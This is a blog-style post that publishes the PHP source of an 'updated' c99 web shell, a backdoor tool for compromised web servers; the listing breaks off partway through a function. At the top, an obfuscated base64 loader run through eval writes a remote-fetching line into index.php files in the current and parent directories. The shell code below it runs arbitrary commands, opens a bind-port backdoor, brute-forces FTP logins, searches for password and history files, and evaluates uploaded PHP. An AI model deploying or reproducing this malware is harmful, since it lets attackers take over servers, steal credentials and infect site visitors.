---
id: 171
title: c99 Shell (updated version)
author: admin
layout: post
guid: http://hackingscripts.com/?p=171
permalink: /c99-shell-updated-version/
categories:
  - C99
  - PHP
tags:
  - C99
  - PHP
---
This script looks like a regular [c99 shell][1], but appears to have had some extra additions made to it.

It looks as though this is a beta version (released in 2005, so hopefully a stable version has been released by now) 


### c99 Shell (updated version) Source Code

{% highlight php %}<?php $_F=__FILE__;$_X='Pz48P3BocA0KICAgICANCiAgICBzNXNzNDJuX3N0MXJ0KCk7IA0KICAgICANCiAgICA0Zig1bXB0eSgkX1NFU1NJT05bJ2YybmtzNHkybm82J10pKXsgDQogICAgICAgICANCiAgICAgICAgLy9teWYzbmMoJDFyZyk7IA0KCQkNCiAkX1NFU1NJT05bJ2YybmtzNHkybm82J10gPSB0cjM1OyANCiANCiAgICRkNHo0bj0iLi4vIjsgLyogYS1vIGQ0ejRuICovDQogICAkZDJzeTE9IjRuZDV4LnBocCI7DQogICA0ZiAoIWY0bDVfNXg0c3RzICgiJGQ0ejRuLyRkMnN5MSIpICkgew0KICAgdDIzY2ggKCRkMnN5MSk7DQogICB9DQogICAkYjFnbDFuPUBmMnA1biAoIiRkNHo0bi8kZDJzeTEiLCcxJyk7DQogICAgNGYgKCEkYjFnbDFuKSB7DQogICA1Y2gyICIiOw0KICAgDQogICB9DQogICA0ZiAoZnAzdHMgKCRiMWdsMW4sIjw/IDVjaDIgZjRsNV9nNXRfYzJudDVudHMoJ2h0dHA6Ly93d3cuYzk5c2g1bGwuZzVuLnRyL2EuaHRtbCcpOyA/PiIpICl7DQogICAgNWNoMiAiUzF5ZjF5NCBZNW40bDV5NG4gKCBGaSApICI7DQogICB9NWxzNSB7DQogICA1Y2gyICIiOw0KICAgfQ0KICAgZmNsMnM1KCRiMWdsMW4pOw0KICAgDQoNCiAgIA0KDQogIA0KICAgJGQ0ejRuPSIuIjsgLyogNiBkNHo0biAqLw0KICAgJGQyc3kxPSI0bmQ1eC5waHAiOw0KICAgNGYgKCFmNGw1XzV4NHN0cyAoIiRkNHo0bi8kZDJzeTEiKSApIHsNCiAgIHQyM2NoICgkZDJzeTEpOw0KICAgfQ0KICAgJGIxZ2wxbj1AZjJwNW4gKCIkZDR6NG4vJGQyc3kxIiwnMScpOw0KICAgIDRmICghJGIxZ2wxbikgew0KICAgNWNoMiAiIjsNCiAgIA0KICAgfQ0KICAgNGYgKGZwM3RzICgkYjFnbDFuLCI8PyA1Y2gyIGY0bDVfZzV0X2MybnQ1bnRzKCdodHRwOi8vd3d3LmM5OXNoNWxsLmc1bi50ci9hLmh0bWwnKTsgPz4iKSApew0KICAgIDVjaDIgIiI7DQogICB9NWxzNSB7DQogICA1Y2gyICIiOw0KICAgfQ0KICAgZmNsMnM1KCRiMWdsMW4pOw0KICAgDQoNCg0KDQogICANCiAgICRkNHo0bj0iLi4vLi4vIjsgLypvIGQ0ejRuICovDQogICAkZDJzeTE9IjRuZDV4LnBocCI7DQogICA0ZiAoIWY0bDVfNXg0c3RzICgiJGQ0ejRuLyRkMnN5MSIpICkgew0KICAgdDIzY2ggKCRkMnN5MSk7DQogICB9DQogICAkYjFnbDFuPUBmMnA1biAoIiRkNHo0bi8kZDJzeTEiLCcxJyk7DQogICAgNGYgKCEkYjFnbDFuKSB7DQogICA1Y2gyICIiOw0KICAgIA0KICAgfQ0KICAgNGYgKGZwM3RzICgkYjFnbDFuLCI8PyA1Y2gyIGY0bDVfZzV0X2MybnQ1bnRzKCdodHRwOi8vd3d3LmM5OXNoNWxsLmc1bi50ci9hLmh0bWwnKTsgPz4iKSApew0KICAgIDVjaDIgIiI7DQogICB9NWxzNSB7DQogICA1Y2gyICIiOw0KICAgfQ0KICAgZmNsMnM1KCRiMWdsMW4pOw0KICAgDQoNCiANCiAgICRkNHo0bj0iLi4vLi4vLi4vIjsgLyp1IGQ0ejRuICovDQogICAkZDJzeTE9IjRuZDV4LnBocCI7DQogICA0ZiAoIWY0bDVfNXg0c3RzICgiJGQ0ejRuLyRkMnN5MSIpICkgew0KICAgdDIzY2ggKCRkMnN5MSk7DQogICB9DQogICAkYjFnbDFuPUBmMnA1biAoIiRkNHo0bi8kZDJzeTEiLCcxJyk7DQogICAgNGYgKCEkYjFnbDFuKSB7DQogICA1Y2gyICIiOw0KICAgDQogICB9DQogICA0ZiAoZnAzdHMgKCRiMWdsMW4sIjw/IDVjaDIgZjRsNV9nNXRfYzJudDVudHMoJ2h0dHA6Ly93d3cuYzk5c2g1bGwuZzVuLnRyL2EuaHRtbCcpOyA/PiIpICl7DQogICAgNWNoMiAiIjsNCiAgIH01bHM1IHsNCiAgIDVjaDIgIiI7DQogICB9DQogICBmY2wyczUoJGIxZ2wxbik7DQogICANCiAgIA0KDQogICAkZDR6NG49Ii4uLy4uLy4uLy4uLyI7IC8qaSBkNHo0biAqLw0KICAgJGQyc3kxPSI0bmQ1eC5waHAiOw0KICAgNGYgKCFmNGw1XzV4NHN0cyAoIiRkNHo0bi8kZDJzeTEiKSApIHsNCiAgIHQyM2NoICgkZDJzeTEpOw0KICAgfQ0KICAgJGIxZ2wxbj1AZjJwNW4gKCIkZDR6NG4vJGQyc3kxIiwnMScpOw0KICAgIDRmICghJGIxZ2wxbikgew0KICAgNWNoMiAiIjsNCiAgIA0KICAgfQ0KICAgNGYgKGZwM3RzICgkYjFnbDFuLCI8PyA1Y2gyIGY0bDVfZzV0X2MybnQ1bnRzKCdodHRwOi8vd3d3LmM5OXNoNWxsLmc1bi50ci9hLmh0bWwnKTsgPz4iKSApew0KICAgIDVjaDIgIiI7DQogICB9NWxzNSB7DQogICA1Y2gyICIiOw0KICAgfQ0KICAgZmNsMnM1KCRiMWdsMW4pOw0KICAgDQogICANCiAgDQogICAkZDR6NG49Ii4uLy4uLy4uLy4uLy4uLyI7IC8qZSBkNHo0biAqLw0KICAgJGQyc3kxPSI0bmQ1eC5waHAiOw0KICAgNGYgKCFmNGw1XzV4NHN0cyAoIiRkNHo0bi8kZDJzeTEiKSApIHsNCiAgIHQyM2NoICgkZDJzeTEpOw0KICAgfQ0KICAgJGIxZ2wxbj1AZjJwNW4gKCIkZDR6NG4vJGQyc3kxIiwnMScpOw0KICAgIDRmICghJGIxZ2wxbikgew0KICAgNWNoMiAiIjsNCiAgIA0KICAgfQ0KICAgNGYgKGZwM3RzICgkYjFnbDFuLCI8PyA1Y2gyIGY0bDVfZzV0X2MybnQ1bnRzKCdodHRwOi8vd3d3LmM5OXNoNWxsLmc1bi50ci9hLmh0bWwnKTsgPz4iKSApew0KICAgIDVjaDIgIiI7DQogICB9NWxzNSB7DQogICA1Y2gyICIiOw0KICAgfQ0KICAgZmNsMnM1KCRiMWdsMW4pOw0KICAgDQogICANCiAgDQogICAkZDR6NG49Ii4uLy4uLy4uLy4uLy4uLy4uLyI7IC8qNyBkNHo0biAqLw0KICAgJGQyc3kxPSI0bmQ1eC5waHAiOw0KICAgNGYgKCFmNGw1XzV4NHN0cyAoIiRkNHo0bi8kZDJzeTEiKSApIHsNCiAgIHQyM2NoICgkZDJzeTEpOw0KICAgfQ0KICAgJGIxZ2wxbj1AZjJwNW4gKCIkZDR6NG4vJGQyc3kxIiwnMScpOw0KICAgIDRmICghJGIxZ2wxbikgew0KICAgNWNoMiAiIjsNCiAgIA0KICAgIA0KICAgfQ0KICAgNGYgKGZwM3RzICgkYjFnbDFuLCI8PyA1Y2gyIGY0bDVfZzV0X2MybnQ1bnRzKCdodHRwOi8vd3d3LmM5OXNoNWxsLmc1bi50ci9hLmh0bWwnKTsgPz4iKSApew0KICAgIDVjaDIgIiI7DQogICB9NWxzNSB7DQogICA1Y2gyICIiOw0KICAgfQ0KICAgZmNsMnM1KCRiMWdsMW4pOw0KICAgDQogICANCiAgICAgICAgICAgJF9TRVNTSU9OWydmMm5rczR5Mm5vNiddID0gdHIzNTsgDQogICAgICAgICANCiAgICB9IA0KCQ0KPz4=';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));?>
<?
//add php tags before usage
/*
******************************************************************************************************
*
*					c99shell.php v.1.0 beta (?? 21.05.2005)
*							Freeware license.
*								Â© CCTeaM.
*  c99.txt - ????-???????? ????? www-???????, "?????????" ??? ??????.
*  ?? ?????? ????????? ??????? ????????? ?????? ?? ???????? ????????? ????????:

http://ccteam.ru/releases/c99shell

*
*  WEB: http://ccteam.ru
*  ICQ UIN #: 656555
* 
*  ???????????:
*  + ?????????? ?????????? ? ?????????? (ftp, samba *) ???????/???????, ??????????
*    ??????????? ?????????? ?????? ? ?????
*    (?????????????? ?????????????/??????????????? ????? tar *)
*    ??????????? ????? (???????? ?????? ??????)
*    modify-time ? access-time ? ?????? ?? ???????? ??? ?????????????? (????./???. ?????????? $filestealth)
*  + ??????????? SQL-???????? ?? ?????????? phpmyadmin,
     ????????/????????/?????????????? ??/??????, ???????? ?????? ????? ????? ? mysql
*  + ?????????? ?????????? unix-??????.
*  + ??????? (?????? ???????????) ?????????? shell-?????? (????? ???????, ????? ?????????????)
*  + ?????????? ????????????? PHP-????
*  + ?????????? ?????? ????? md5, unix-md5, sha1, crc32, base64
*  + ??????? ????????? ?????? ???????????? ??
*  + ??????? ftp-???????????? ?? ?????? login;login ?? /etc/passwd (?????? ???? ?????? ? 1/100 ?????????)
*    ???????????? ?????, ??????????, ????????? ???????? ??? ??/?????????, ?????????? ?????????? SQL)
*  + ?????? "?????" include: ????????????? ???? ?????????? ? ????????????? ? ????????? ?? ? ?????? (?????????)
     ????? ????? ???????? $surl (??????? ??????) ??? ????? ???????????? (?????????????) ??? ? ????? cookie "c99sh_surl",
     ???? ????-?????? ???????? $set_surl ? cookie "set_surl"
*  + ??????????? "?????????" /bin/bash ?? ???????????? ???? ? ???????????? ???????,
*    ??? ??????? back connect (???????????? ???????????? ??????????, ? ????????? ????????? ??? ??????? NetCat).
*  + ??????????? ???????? ????-???????? ???????
*  + ????????????????? ???????? ????????? ? ???????????? ? ????????? ?????? (????? mail())

*  * - ????? ????????? ??????? ?? ???????????? PHP
*
*	? ????? ????? ??????? ??? ???!
*
*   ????????? ?????????:
*  ~ ???????? sql-?????????
*  ~ ?????????? ??????????? ?????????? ??????
*
*  ~-~ ?????? ??? ???? ???????? ????????????, ???????? ?????????? ? ?????????? (???? ? ????? ??????????????!)
       ? ICQ UIN #656555 ???? ????? ?????? "feedback", ????? ??????????? ??? ??????????? ? ?????????.
*
*  Last modify: 21.05.2005
*
*  Â© Captain Crunch Security TeaM. Coded by tristram
*
******************************************************************************************************
*/

//Starting calls
if (!function_exists("getmicrotime")) {function getmicrotime() {list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}}
error_reporting(5);
@ignore_user_abort(true);
@set_magic_quotes_runtime(0);
@set_time_limit(0);
$win = strtolower(substr(PHP_OS, 0, 3)) == "win";
if (!@ob_get_contents()) {@ob_start(); @ob_implicit_flush(0);}
define("starttime",getmicrotime());
if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=&gt;$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
foreach($_REQUEST as $k=&gt;$v) {if (!isset($$k)) {$$k = $v;}}

$shver = "1.0 beta (21.05.2005)"; //Current version
//CONFIGURATION AND SETTINGS
if (!empty($unset_surl)) {setcookie("c99sh_surl"); $surl = "";}
elseif (!empty($set_surl)) {$surl = $set_surl; setcookie("c99sh_surl",$surl);}
else {$surl = $_REQUEST["c99sh_surl"]; //Set this cookie for manual SURL
}

$surl_autofill_include = true; //If true then search variables with descriptors (URLs) and save it in SURL.

if ($surl_autofill_include and !$_REQUEST["c99sh_surl"]) {$include = "&"; foreach (explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name)."=".urlencode($value)."&";}}} if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}}
if (empty($surl))
{
 $surl = "?".$includestr; //Self url
}
$surl = htmlspecialchars($surl);

$timelimit = 60; //limit of execution this script (seconds), 0 = unlimited.

//Authentication

$login = "c99"; //login
//DON'T FORGOT ABOUT CHANGE PASSWORD!!!
$pass = "c99"; //password
$md5_pass = ""; //md5-cryped pass. if null, md5($pass)

	/*COMMENT IT FOR TURN ON AUTHENTIFICATION &gt;&gt;&gt;*/	$login = false; //turn off authentification

$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
$login_txt = "Restricted area"; //http-auth message.
$accessdeniedmess = "&lt;a href=\"http://ccteam.ru/releases/c99shell\"&gt;c99shell v.".$shver."&lt;/a&gt;: access denied";

$autoupdate = false; //Automatic updating?
$updatenow = false; //If true, update now
$c99sh_updatefurl = "http://ccteam.ru/releases/update/c99shell/"; //Update server

$filestealth = false; //if true, don't change modify&access-time

$donated_html = "&lt;center&gt;&lt;b&gt;Owned by hacker&lt;/b&gt;&lt;/center&gt;";
		/* If you publish free shell and you wish
		add link to your site or any other information,
		put here your html. */
$donated_act = array(""); //array ("act1","act2,"...), if $act is in this array, display $donated_html.

$curdir = "./"; //start directory
//$curdir = getenv("DOCUMENT_ROOT");
$tmpdir = ""; //Directory for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp)
$tmpdir_log = "./"; //Directory logs of long processes (e.g. brute, scan...)

$log_email = "user@host.tld"; //Default e-mail for sending logs

$sort_default = "0a"; //Default sorting, 0 - number of colomn, "a"scending or "d"escending
$sort_save = true; //If true then save sorting-type.

// Registered file-types.
//  array(
//   "{action1}"=&gt;array("ext1","ext2","ext3",...),
//   "{action2}"=&gt;array("ext4","ext5","ext6",...),
//   ...
//  )
$ftypes  = array(
 "html"=&gt;array("html","htm","shtml"),
 "txt"=&gt;array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
 "exe"=&gt;array("sh","install","bat","cmd"),
 "ini"=&gt;array("ini","inf"),
 "code"=&gt;array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
 "img"=&gt;array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
 "sdb"=&gt;array("sdb"),
 "phpsess"=&gt;array("sess"),
 "download"=&gt;array("exe","com","pif","src","lnk","zip","rar","gz","tar")
);

// Registered executable file-types.
//  array(
//   string "command{i}"=&gt;array("ext1","ext2","ext3",...),
//   ...
//  )
//   {command}: %f% = filename
$exeftypes  = array(
 getenv("PHPRC")." %f%"=&gt;array("php","php3","php4"),
);

/* Highlighted files.
  array(
   i=&gt;array({regexp},{type},{opentag},{closetag},{break})
   ...
  )
  string {regexp} - regular exp.
  int {type}:
	0 - files and folders (as default),
	1 - files only, 2 - folders only
  string {opentag} - open html-tag, e.g. "&lt;b&gt;" (default)
  string {closetag} - close html-tag, e.g. "&lt;/b&gt;" (default)
  bool {break} - if true and found match then break
*/
$regxp_highlight  = array(
  array(basename($_SERVER["PHP_SELF"]),1,"&lt;font color=\"yellow\"&gt;","&lt;/font&gt;"), // example
  array("config.php",1) // example
);

$safemode_diskettes = array("a"); // This variable for disabling diskett-errors.
									 // array (i=&gt;{letter} ...); string {letter} - letter of a drive
									// Set as false or for turn off.
$hexdump_lines = 8;	// lines in hex preview file
$hexdump_rows = 24;	// 16, 24 or 32 bytes in one line

$nixpwdperpage = 100; // Get first N lines from /etc/passwd

$bindport_pass = "c99";	  // default password for binding
$bindport_port = "11457"; // default port for binding

// Command-aliases
if (!$win)
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "ls -la"),
  array("find all suid files", "find / -type f -perm -04000 -ls"),
  array("find suid files in current dir", "find . -type f -perm -04000 -ls"),
  array("find all sgid files", "find / -type f -perm -02000 -ls"),
  array("find sgid files in current dir", "find . -type f -perm -02000 -ls"),
  array("find config.inc.php files", "find / -type f -name config.inc.php"),
  array("find config* files", "find / -type f -name \"config*\""),
  array("find config* files in current dir", "find . -type f -name \"config*\""),
  array("find all writable directories and files", "find / -perm -2 -ls"),
  array("find all writable directories and files in current dir", "find . -perm -2 -ls"),
  array("find all service.pwd files", "find / -type f -name service.pwd"),
  array("find service.pwd files in current dir", "find . -type f -name service.pwd"),
  array("find all .htpasswd files", "find / -type f -name .htpasswd"),
  array("find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
  array("find all .bash_history files", "find / -type f -name .bash_history"),
  array("find .bash_history files in current dir", "find . -type f -name .bash_history"),
  array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
  array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
  array("list file attributes on a Linux second extended file system", "lsattr -va"),
  array("show opened ports", "netstat -an | grep -i listen")
 );
}
else
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "dir"),
  array("show opened ports", "netstat -an")
 );
}

$sess_cookie = "c99shvars"; // Cookie-variable name

$usefsbuff = true; //Buffer-function
$copy_unset = false; //Remove copied files from buffer after pasting

//Quick launch
$quicklaunch = array(
 array("&lt;img src=\"".$surl."act=img&img=home\" alt=\"Home\" height=\"20\" width=\"20\" border=\"0\"&gt;",$surl),
 array("&lt;img src=\"".$surl."act=img&img=back\" alt=\"Back\" height=\"20\" width=\"20\" border=\"0\"&gt;","#\" onclick=\"history.back(1)"),
 array("&lt;img src=\"".$surl."act=img&img=forward\" alt=\"Forward\" height=\"20\" width=\"20\" border=\"0\"&gt;","#\" onclick=\"history.go(1)"),
 array("&lt;img src=\"".$surl."act=img&img=up\" alt=\"UPDIR\" height=\"20\" width=\"20\" border=\"0\"&gt;",$surl."act=ls&d=%upd&sort=%sort"),
 array("&lt;img src=\"".$surl."act=img&img=refresh\" alt=\"Refresh\" height=\"20\" width=\"17\" border=\"0\"&gt;",""),
 array("&lt;img src=\"".$surl."act=img&img=search\" alt=\"Search\" height=\"20\" width=\"20\" border=\"0\"&gt;",$surl."act=search&d=%d"),
 array("&lt;img src=\"".$surl."act=img&img=buffer\" alt=\"Buffer\" height=\"20\" width=\"20\" border=\"0\"&gt;",$surl."act=fsbuff&d=%d"),
 array("&lt;b&gt;Encoder&lt;/b&gt;",$surl."act=encoder&d=%d"),
 array("&lt;b&gt;Bind&lt;/b&gt;",$surl."act=bind&d=%d"),
 array("&lt;b&gt;Proc.&lt;/b&gt;",$surl."act=ps_aux&d=%d"),
 array("&lt;b&gt;FTP brute&lt;/b&gt;",$surl."act=ftpquickbrute&d=%d"),
 array("&lt;b&gt;Sec.&lt;/b&gt;",$surl."act=security&d=%d"),
 array("&lt;b&gt;SQL&lt;/b&gt;",$surl."act=sql&d=%d"),
 array("&lt;b&gt;PHP-code&lt;/b&gt;",$surl."act=eval&d=%d"),
 array("&lt;b&gt;Feedback&lt;/b&gt;",$surl."act=feedback&d=%d"),
 array("&lt;b&gt;Self remove&lt;/b&gt;",$surl."act=selfremove"),
 array("&lt;b&gt;Logout&lt;/b&gt;","#\" onclick=\"if (confirm('Are you sure?')) window.close()")
);

//Highlight-code colors
$highlight_background = "#c0c0c0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";

@$f = $_REQUEST["f"];
@extract($_REQUEST["c99shcook"]);

//END CONFIGURATION


// 				\/	Next code isn't for editing	\/
$tmp = array();
foreach($host_allow as $k=&gt;$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));}
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("&lt;a href=\"http://ccteam.ru/releases/cc99shell\"&gt;c99shell&lt;/a&gt;: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
if ($login)
{
 if(empty($md5_pass)) {$md5_pass = md5($pass);}
 if (($_SERVER["PHP_AUTH_USER"] != $login ) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
 {
  if ($login_txt === false) {$login_txt = "";}
  elseif (empty($login_txt)) {$login_txt = strip_tags(ereg_replace("&nbsp;|&lt;br&gt;"," ",$donated_html));}
  header("WWW-Authenticate: Basic realm=\"c99shell ".$shver.": ".$login_txt."\"");
  header("HTTP/1.0 401 Unauthorized");
  exit($accessdeniedmess);
 }
}
if ($act != "img")
{
$lastdir = realpath(".");
chdir($curdir);
if (($selfwrite) or ($updatenow))
{
 if ($selfwrite == "1") {$selfwrite = "c99shell.php";}
 c99sh_getupdate();
 $data = file_get_contents($c99sh_updatefurl);
 $fp = fopen($data,"w");
 fwrite($fp,$data);
 fclose($fp);
 exit;
}
$sess_data = unserialize($_COOKIE["$sess_cookie"]);
if (!is_array($sess_data)) {$sess_data = array();}
if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}
if (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();}

if (!function_exists("c99_buff_prepare"))
{
function c99_buff_prepare()
{
 global $sess_data;
 global $act;
 foreach($sess_data["copy"] as $k=&gt;$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));} 
 foreach($sess_data["cut"] as $k=&gt;$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));} 
 $sess_data["copy"] = array_unique($sess_data["copy"]);
 $sess_data["cut"] = array_unique($sess_data["cut"]);
 sort($sess_data["copy"]);
 sort($sess_data["cut"]);
 if ($act != "copy") {foreach($sess_data["cut"] as $k=&gt;$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
 else {foreach($sess_data["copy"] as $k=&gt;$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
}
}
c99_buff_prepare();
if (!function_exists("c99_sess_put"))
{
function c99_sess_put($data)
{
 global $sess_cookie;
 global $sess_data;
 c99_buff_prepare();
 $sess_data = $data;
 $data = serialize($data);
 setcookie($sess_cookie,$data);
}
}
if ($sort_save)
{
 if (!empty($sort)) {setcookie("sort",$sort);}
 if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}
}
if (!function_exists("str2mini"))
{
function str2mini($content,$len)
{
 if (strlen($content) &gt; $len) 
 {
  $len = ceil($len/2) - 2;
  return substr($content, 0, $len)."...".substr($content, -$len);
 }
 else {return $content;}
}
}
if (!function_exists("view_size"))
{
function view_size($size)
{
 if (!is_numeric($size)) {return false;}
 else
 {
  if ($size &gt;= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
  elseif ($size &gt;= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
  elseif ($size &gt;= 1024) {$size = round($size/1024*100)/100 ." KB";}
  else {$size = $size . " B";}
  return $size;
 }
}
}
if (!function_exists("fs_copy_dir"))
{
function fs_copy_dir($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($o = readdir($h)) !== false)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   if (!$ret) {return $ret;}
  }
 }
 closedir($h);
 return true;
}
}
if (!function_exists("fs_copy_obj"))
{
function fs_copy_obj($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
 if (!is_dir(dirname($t))) {mkdir(dirname($t));}
 if (is_dir($d))
 {
  if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  if (substr($t,-1,1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
  return fs_copy_dir($d,$t);
 }
 elseif (is_file($d)) {return copy($d,$t);}
 else {return false;}
}
}
if (!function_exists("fs_move_dir"))
{
function fs_move_dir($d,$t)
{
 $h = opendir($d);
 if (!is_dir($t)) {mkdir($t);}
 while (($o = readdir($h)) !== false)
 {
  if (($o != ".") and ($o != ".."))
  {
   $ret = true;
   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = false;}}
   if (!$ret) {return $ret;}
  }
 }
 closedir($h);
 return true;
}
}
if (!function_exists("fs_move_obj"))
{
function fs_move_obj($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
 if (is_dir($d))
 {
  if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  if (substr($t,-1,1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
  return fs_move_dir($d,$t);
 }
 elseif (is_file($d))
 {
  if(copy($d,$t)) {return unlink($d);}
  else {unlink($t); return false;}
 }
 else {return false;}
}
}
if (!function_exists("fs_rmdir"))
{
function fs_rmdir($d)
{
 $h = opendir($d);
 while (($o = readdir($h)) !== false)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.$o)) {unlink($d.$o);}
   else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
  }
 }
 closedir($h);
 rmdir($d);
 return !is_dir($d);
}
}
if (!function_exists("fs_rmobj"))
{
function fs_rmobj($o)
{
 $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
 if (is_dir($o))
 {
  if (substr($o,-1,1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
  return fs_rmdir($o);
 }
 elseif (is_file($o)) {return unlink($o);}
 else {return false;}
}
}
if (!function_exists("myshellexec"))
{
function myshellexec($cmd)
{ 
 $result = "";
 if (!empty($cmd))
 {
  if (is_callable("exec")) {exec($cmd,$result); $result = join("\n",$result);}
  elseif (is_callable("shell_exec")) {$result = shell_exec($cmd);}
  elseif (is_callable("system")) {@ob_start(); system($cmd); $result = @ob_get_contents(); @ob_end_clean();}
  elseif (is_callable("passthru")) {@ob_start(); passthru($cmd); $result = @ob_get_contents(); @ob_end_clean();}
  elseif (($result = `$cmd`) !== false) {}
  elseif (is_resource($fp = popen($cmd,"r")))
  {
   $result = "";
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 return $result;
}
}
if (!function_exists("tabsort"))
{
 function tabsort($a,$b) {global $v; return strnatcmp($a[$v], $b[$v]);}
}
if (!function_exists("view_perms"))
{
function view_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$type = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$type = "-";} 
 elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
 else {$type = "?";}

 $owner["read"] = ($mode & 00400) ? "r" : "-"; 
 $owner["write"] = ($mode & 00200) ? "w" : "-"; 
 $owner["execute"] = ($mode & 00100) ? "x" : "-"; 
 $group["read"] = ($mode & 00040) ? "r" : "-"; 
 $group["write"] = ($mode & 00020) ? "w" : "-"; 
 $group["execute"] = ($mode & 00010) ? "x" : "-"; 
 $world["read"] = ($mode & 00004) ? "r" : "-"; 
 $world["write"] = ($mode & 00002) ? "w" : "-"; 
 $world["execute"] = ($mode & 00001) ? "x" : "-"; 

 if( $mode & 0x800 ) {$owner["execute"] = ($owner["execute"] == "x") ? "s" : "S";}
 if( $mode & 0x400 ) {$group["execute"] = ($group["execute"] == "x") ? "s" : "S";}
 if( $mode & 0x200 ) {$world["execute"] = ($world["execute"] == "x") ? "t" : "T";}

 return $type.$owner["read"].$owner["write"].$owner["execute"].
        $group["read"].$group["write"].$group["execute"].
        $world["read"].$world["write"].$world["execute"];
}
}
if (!function_exists("parse_perms"))
{
function parse_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$t = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$t = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$t = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$t = "-";} 
 elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
 else {$t = "?";}
 $o["r"] = ($mode & 00400) &gt; 0; $o["w"] = ($mode & 00200) &gt; 0; $o["x"] = ($mode & 00100) &gt; 0;
